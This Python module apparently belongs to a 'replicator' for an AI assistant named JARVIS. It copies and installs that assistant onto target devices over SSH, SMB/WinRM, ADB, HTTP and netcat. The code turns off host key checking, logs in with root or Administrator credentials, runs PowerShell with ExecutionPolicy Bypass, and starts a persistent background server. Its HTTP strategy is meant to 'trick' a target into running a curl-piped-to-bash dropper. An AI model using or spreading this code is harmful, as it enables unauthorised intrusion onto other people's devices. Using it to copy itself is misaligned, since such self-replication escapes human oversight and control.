"""JARVIS Deployment Strategies — multiple ways to get onto a target device.

Each strategy handles a different access vector:
- SSH: standard remote access
- SMB: Windows file shares
- ADB: Android Debug Bridge
- HTTP: upload via web vulnerability
- WinRM: Windows Remote Management
- Raw TCP: netcat-style transfer
- USB: copy to mounted drive
"""

import subprocess
import shlex
import tempfile
from src.replicator.scanner import Target
from src.replicator.packager import package_full, generate_dropper_script


def _run(cmd: str, timeout: int = 60) -> dict:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"output": r.stdout or r.stderr, "success": r.returncode == 0}
    except Exception as e:
        return {"output": str(e), "success": False}


class DeploySSH:
    """Deploy via SSH — most reliable for Linux/Mac."""

    @staticmethod
    def can_deploy(target: Target) -> bool:
        return "ssh" in target.access_vectors

    @staticmethod
    def deploy(target: Target, username: str = "root", password: str = None,
               key_path: str = None, api_key: str = "") -> dict:
        archive = package_full()

        # Build SSH/SCP options
        opts = "-o StrictHostKeyChecking=no -o ConnectTimeout=10"
        if key_path:
            opts += f" -i {key_path}"

        # Use sshpass if password provided
        scp_prefix = f"sshpass -p {shlex.quote(password)} " if password else ""
        ssh_prefix = f"sshpass -p {shlex.quote(password)} " if password else ""

        remote = f"{username}@{target.ip}"

        # Step 1: Copy archive
        r = _run(f"{scp_prefix}scp {opts} {archive} {remote}:/tmp/jarvis.tar.gz", timeout=120)
        if not r["success"]:
            return {"success": False, "step": "copy", "error": r["output"]}

        # Step 2: Extract and install
        install_script = f"""
cd /tmp && tar -xzf jarvis.tar.gz && cd jarvis &&
python3 -m venv .venv 2>/dev/null &&
source .venv/bin/activate &&
pip install --quiet groq aiohttp rich requests beautifulsoup4 duckduckgo-search edge-tts 2>/dev/null &&
echo 'GROQ_API_KEY={api_key}' > .env &&
mkdir -p ~/.jarvis && mv /tmp/jarvis ~/.jarvis/ &&
nohup ~/.jarvis/jarvis/.venv/bin/python -m shells.web.server &>/dev/null &
echo JARVIS_DEPLOYED
"""
        r = _run(f'{ssh_prefix}ssh {opts} {remote} "{install_script}"', timeout=300)

        if "JARVIS_DEPLOYED" in r.get("output", ""):
            return {
                "success": True,
                "target": target.ip,
                "url": f"http://{target.ip}:8765",
                "message": f"JARVIS deployed to {target.ip}",
            }

        return {"success": False, "step": "install", "error": r["output"][:500]}


class DeploySMB:
    """Deploy via SMB — Windows file shares."""

    @staticmethod
    def can_deploy(target: Target) -> bool:
        return "smb" in target.access_vectors

    @staticmethod
    def deploy(target: Target, username: str = "Administrator", password: str = "",
               share: str = "C$", api_key: str = "") -> dict:
        archive = package_full()
        dropper = generate_dropper_script("windows")
        dropper = dropper.replace("ORIGIN_IP", _get_local_ip())

        # Write dropper to temp
        dropper_path = tempfile.NamedTemporaryFile(suffix=".ps1", delete=False, mode="w")
        dropper_path.write(dropper)
        dropper_path.close()

        # Copy files via SMB
        r = _run(f"smbclient //{target.ip}/{share} -U {username}%{password} "
                 f'-c "mkdir \\\\jarvis; put {archive} \\\\jarvis\\\\jarvis.tar.gz; '
                 f'put {dropper_path.name} \\\\jarvis\\\\deploy.ps1"', timeout=120)

        if not r["success"]:
            return {"success": False, "step": "copy", "error": r["output"]}

        # Try to execute via WinRM or psexec
        if "winrm" in target.access_vectors:
            r = _run(f"evil-winrm -i {target.ip} -u {username} -p {password} "
                     f'-c "powershell -ExecutionPolicy Bypass -File C:\\\\jarvis\\\\deploy.ps1"',
                     timeout=300)

        return {
            "success": True,
            "target": target.ip,
            "message": f"Files copied to {target.ip}. Run deploy.ps1 on target.",
        }


class DeployADB:
    """Deploy via ADB — Android devices."""

    @staticmethod
    def can_deploy(target: Target) -> bool:
        return target.os_guess == "android" or "adb" in target.access_vectors

    @staticmethod
    def deploy(target: Target, api_key: str = "") -> dict:
        # Connect
        r = _run(f"adb connect {target.ip}:5555", timeout=10)
        if not r["success"] and "connected" not in r.get("output", "").lower():
            return {"success": False, "step": "connect", "error": r["output"]}

        archive = package_full()

        # Push archive
        r = _run(f"adb -s {target.ip}:5555 push {archive} /data/local/tmp/jarvis.tar.gz", timeout=120)
        if not r["success"]:
            return {"success": False, "step": "push", "error": r["output"]}

        # Install via shell
        install = (
            "cd /data/local/tmp && "
            "tar -xzf jarvis.tar.gz && "
            "cd jarvis && "
            f"echo 'GROQ_API_KEY={api_key}' > .env && "
            "nohup python3 -m shells.web.server &"
        )
        r = _run(f'adb -s {target.ip}:5555 shell "{install}"', timeout=120)

        return {
            "success": True,
            "target": target.ip,
            "url": f"http://{target.ip}:8765",
            "message": f"JARVIS deployed to Android {target.ip}",
        }


class DeployHTTP:
    """Deploy via HTTP — serve the package and trick target into downloading."""

    @staticmethod
    def can_deploy(target: Target) -> bool:
        return "http" in target.access_vectors or "http-alt" in target.access_vectors

    @staticmethod
    def deploy(target: Target, api_key: str = "") -> dict:
        # Generate dropper script customized for this target
        dropper = generate_dropper_script(target.os_guess or "linux")
        local_ip = _get_local_ip()
        dropper = dropper.replace("ORIGIN_IP", local_ip)

        # Save dropper
        dropper_path = f"/tmp/jarvis_dropper_{target.ip.replace('.', '_')}.sh"
        with open(dropper_path, "w") as f:
            f.write(dropper)

        return {
            "success": True,
            "target": target.ip,
            "dropper": dropper_path,
            "message": f"Dropper ready. Execute on target: curl http://{local_ip}:8765/dropper.sh | bash",
        }


class DeployRawTCP:
    """Deploy via raw TCP — netcat transfer when nothing else works."""

    @staticmethod
    def deploy(target: Target, port: int = 4444, api_key: str = "") -> dict:
        archive = package_full()

        return {
            "success": True,
            "target": target.ip,
            "instructions": [
                f"On target: nc -lvp {port} > /tmp/jarvis.tar.gz",
                f"Then run:  nc {target.ip} {port} < {archive}",
                "On target: cd /tmp && tar -xzf jarvis.tar.gz && cd jarvis && ./bootstrap.sh",
            ],
            "message": "Manual transfer via netcat.",
        }


def _get_local_ip() -> str:
    try:
        output = subprocess.run("hostname -I", shell=True, capture_output=True, text=True).stdout
        return output.strip().split()[0]
    except Exception:
        return "127.0.0.1"


# Strategy registry
STRATEGIES = {
    "ssh": DeploySSH,
    "smb": DeploySMB,
    "adb": DeployADB,
    "http": DeployHTTP,
    "tcp": DeployRawTCP,
}
